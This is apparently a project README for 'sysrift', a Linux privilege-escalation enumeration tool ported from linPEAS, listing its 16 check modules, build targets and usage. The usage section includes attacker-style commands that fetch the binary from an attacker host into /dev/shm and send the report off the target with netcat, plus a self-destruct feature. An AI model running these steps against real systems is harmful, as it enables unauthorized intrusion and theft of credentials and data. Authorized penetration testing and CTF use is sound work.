# sysrift

A Linux privilege escalation enumeration tool compiled to a single static binary. Ported from [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and rewritten in [Crystal](https://crystal-lang.org/) for drop-and-run deployment with no runtime dependencies.

## Why

linPEAS is the standard for Linux privesc enumeration, but it's a ~35,000 line Bash script that requires an interpreter, generates process noise, and buries findings in verbose output. sysrift addresses this:

- **Single static binary** -- drop in `/dev/shm`, run, delete. No interpreter, no dependencies.
- **Selective execution** -- run individual modules or combinations instead of a full sweep every time. Active checks (network connections, auth attempts) require explicit opt-in per execution via interactive prompt.
- **Severity-tagged output** -- `[!]` critical, `[+]` medium, `[-]` info, `[ok]` safe. Post-run summary surfaces only critical and medium findings.
- **Smaller footprint** -- one process, one log file. Self-destruct option removes the binary when done.
- **Cross-architecture** -- x86_64 and arm64 via static musl linking.

## Modules

| # | Module | What it checks |
|---|--------|---------------|
| 1 | System Information | Hostname, identity, kernel version, interesting groups (10 entries: sudo, docker, lxd, lxc, disk, adm, shadow, wheel, wireshark, kvm), env vars, PATH hijacking, interpreter library path hijacking (PYTHONPATH, RUBYLIB, PERL5LIB, NODE_PATH writable dir detection), kernel CVEs (8 entries: DirtyCow, eBPF ALU32, Dirty Pipe, OverlayFS FUSE, nf_tables OOB, nf_tables UAF, GameOverlay x2) with distro backport detection (dpkg/rpm package version comparison against tracker-verified fixed versions, derivative distro resolution, distro-gated Ubuntu-only entries, upstream fallback with qualifier), mount option analysis (nosuid/noexec/nodev on key paths), unmounted fstab entries, fstab credential detection |
| 2 | SUID / SGID Binaries | Filesystem scan for SUID/SGID, GTFOBins cross-reference, owner UID filtering, writable SUID + SGID binary detection, unusual locations, nosuid mount cross-reference (downgrades SUID on nosuid mounts), squashfs mount filtering (snap/AppImage), default SUID demotion (su/sudo/mount/etc. demoted to med), SGID group-aware escalation context (interesting group cross-reference), shared library injection analysis on non-standard-path SUIDs (readelf NEEDED resolution against RPATH + standard lib dirs, writable .so/dir/missing dep detection, RPATH/RUNPATH writability), strings-based path hijack analysis (writable absolute paths, relative command names cross-referenced against writable PATH directory order) |
| 3 | Sudo Rights | `sudo -l` analysis, `/etc/sudoers` + `/etc/sudoers.d/` enumeration, NOPASSWD entries, GTFOBins in sudo rules, env_keep dangerous variables (LD_PRELOAD, LD_LIBRARY_PATH, BASH_ENV, ENV, PATH), `!env_reset`, sudo version CVEs (Baron Samedit, CVE-2019-14287, CVE-2023-22809 sudoedit bypass), pivot target directory analysis (runas user owned dirs + root ownership mismatch detection), doas.conf enumeration (nopass/keepenv/persist, identity-filtered), sudo token reuse detection (ptrace_scope + gdb + sibling shells combo assessment) |
| 4 | Credential Hunting | History files (deduplicated with repeat counts), config file credential patterns (with false positive filtering: sentinel values, .NET assembly metadata, ImageMagick templates, file size cap 256KB, line length cap 500 chars), JS/JSON scanning limited to web deploy dirs (/var/www, /srv, /opt), /etc/shadow readability, /etc/passwd hashes, SSH keys (ownership-aware severity: own keys info, others' keys critical), .netrc, cloud credentials, PAM credential extraction (passwd=, bindpw, ldap_bind_pw, secret= in pam.d + standalone LDAP/PAM configs), cached credentials & tickets (Samba TDB, Quest VAS, SSSD caches/secrets, Kerberos keytabs + ticket caches, opasswd — label split: offline crackable vs usable for authentication), TTY audit password harvesting (aureport --tty gated behind auditd detection, streaming read, audit.log fallback) |
| 5 | Writable Files & Dirs | High-value writable files (/etc/passwd, /etc/shadow, /etc/sudoers, /etc/ld.so.preload, etc.), ld.so.conf recursive library path writability (include dirs, conf files, library dirs, ld.so.preload entries), /etc/profile.d/ writable script detection, world-writable directories |
| 6 | Network Information | Interfaces, routes, listening ports (flags databases, Docker API, admin panels, K8s, lateral movement targets), /etc/hosts, ARP, connections, forwarding, legacy r-commands trust (hosts.equiv/shosts.equiv wildcard detection, per-user .rhosts, r-service port 512-514 listeners via /proc/net/tcp, inetd/xinetd config scanning) |
| 7 | Processes, Cron & Timers | Root processes with writable binaries, crontab analysis, cron wildcard injection (tar, chown, chmod), cron target binary writability (/dev/null filtered, directory-type filtered, user-aware severity: root cron = critical, non-root = medium), suspicious process location detection (self-filtered), systemd timers |
| 8 | File Capabilities | `getcap` scan with dangerous capability flagging (21 caps including cap_setuid, cap_sys_admin, cap_bpf, etc.), `=ep` full capability set detection, cap+binary combo detection (43 entries across 11 caps), process capability sets, `/proc/[pid]/status` enumeration for non-zero CapEff/CapAmb across all processes (native hex decoding, zero capsh spawns), noise filtering for Chromium/Electron sandbox cap_sys_admin, SUID helpers, known daemon expected caps |
| 9 | NFS Shares | /etc/exports analysis (no_root_squash detection), showmount enumeration, active NFS mounts |
| 10 | Container / Docker | Docker/LXC/Kubernetes/Podman/containerd/CRI-O detection (cgroup + marker files), runtime socket access (Docker, containerd, CRI-O, Podman rootful + rootless), docker/lxd/lxc group membership, container escape checks (privileged mode via native CapBnd decode, host mounts, procfs/sysfs writable escape surfaces, seccomp/NoNewPrivs), ambient capability enumeration (native hex decode, zero capsh spawns), namespace isolation heuristics (PID via init comm, NET via physical NIC detection, UTS via container ID hostname), AppArmor/SELinux container profile interpretation, runtime CVEs (runc CVE-2019-5736, containerd CVE-2020-15257 gated on host networking, package manager version comparison), escape tool presence enumeration, process count + host daemon heuristic |
| 11 | Installed Software | Compilers, interpreters, transfer tools, package counts, web servers, known vulnerable software (screen, pkexec PwnKit, polkit CVE-2021-3560, Exim), screen/tmux session hijacking (other users' attachable sockets, root session = critical) |
| 12 | Users & Groups | Password policy (/etc/login.defs: PASS_MAX_DAYS, ENCRYPT_METHOD weak hash detection), UID 0 backdoor user detection (root filtered), interactive shell users, non-empty groups, login history, readable home directories, SSH file enumeration (own keys demoted) |
| 13 | Services | Running/enabled services, writable systemd unit files, writable init.d scripts |
| 14 | Interesting Files | Sensitive config files, backups, readable sensitive files, SUID outside standard paths (chrome-sandbox filtered), credential patterns in logs, recently modified files |
| 15 | Security Protections | AppArmor, SELinux, ASLR, mmap_min_addr, kptr_restrict, dmesg_restrict, perf_event_paranoid, ptrace_scope, seccomp, protected_symlinks/hardlinks, unprivileged_userns_clone, unprivileged_bpf_disabled, modules_disabled, module_sig_enforce, lockdown mode, grsecurity/PaX detection |
| 16 | D-Bus / PolicyKit | PolicyKit JS rules analysis (Result.YES/AUTH_SELF with group-awareness against current user), writable pkexec exec.path binaries, writable D-Bus service activation binaries (User=root Exec= path check), D-Bus service file writability, PolicyKit/D-Bus config directory and file writability across 5 paths. Zero spawns — all file reads |

## Build

Requires [Crystal](https://crystal-lang.org/install/) 1.19+.

```bash
# Static x86_64 binary (recommended — no Docker required)
make x86_64-native

# Strip symbols (~30-40% size reduction)
make strip-native

# Native build (dynamic, for testing)
make local

# Static x86_64 binary via Docker (alternative)
make x86_64

# Static arm64 binary via Docker + QEMU
make arm64

# Syntax/type check only (no binary output)
make check
```

### Prerequisites

| Target | Requires |
|--------|----------|
| `make x86_64-native` | Crystal + musl-gcc (`apt install musl-tools`) |
| `make local` | Crystal installed natively |
| `make x86_64` | Docker + `crystallang/crystal:latest-musl` |
| `make arm64` | Docker + QEMU binfmt (`sudo apt install qemu-user-static binfmt-support`) |

Output binaries are placed in `dist/`.

## Usage

```bash
# Serve from attack box
python3 -m http.server 8080 -d dist/

# Drop to target (pick one)
curl http://<attacker>:8080/linaudit_x86_64_native -o /dev/shm/linaudit
wget http://<attacker>:8080/linaudit_x86_64_native -O /dev/shm/linaudit
scp dist/linaudit_x86_64_native user@target:/dev/shm/linaudit

# Run
chmod +x /dev/shm/linaudit && /dev/shm/linaudit
```

The interactive menu lets you:
- Run individual modules by number (e.g., `1` for System Information)
- Run multiple modules with comma separation (e.g., `1,3,5`)
- Run all modules with `0`
- List report files with `r`
- Self-destruct the binary with `x` (keeps report files)

Output is tee'd to a timestamped log file in `/dev/shm/` with ANSI codes stripped:

```bash
# View report
less -R /dev/shm/audit-report_<user>_<timestamp>.txt

# Copy off target
nc <remote-ip> 4444 < /dev/shm/audit-report_<user>_<timestamp>.txt
```

## Status

This is an active work-in-progress (v0.2.0). All 16 modules are functional. See [ARCHITECTURE.md](ARCHITECTURE.md) for design details and technical documentation.

## Known Limitations

- **No 32-bit (i686) support.** Crystal does not target 32-bit architectures. The binary fails with "Exec format error" on i686 systems -- a good example is HTB's retired Irked box (Debian 8, i686, kernel 3.16.0-6-686-pae). This is where interpreted tools like linPEAS win outright. Debian has dropped 32-bit ISOs and i686 is increasingly rare, but legacy infrastructure and older CTF boxes still run it.

## Legal

This tool is intended for authorized penetration testing, security research, and CTF competitions. Unauthorized use against systems you do not own or have explicit written permission to test is illegal. The author assumes no liability for misuse.

## Acknowledgements

sysrift is a port of [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) by [Carlos Polop](https://github.com/carlospolop), part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) project. sysrift does not replicate every linPEAS check -- it focuses on the highest-signal vectors post-foothold, structured for selective execution rather than full-sweep output.
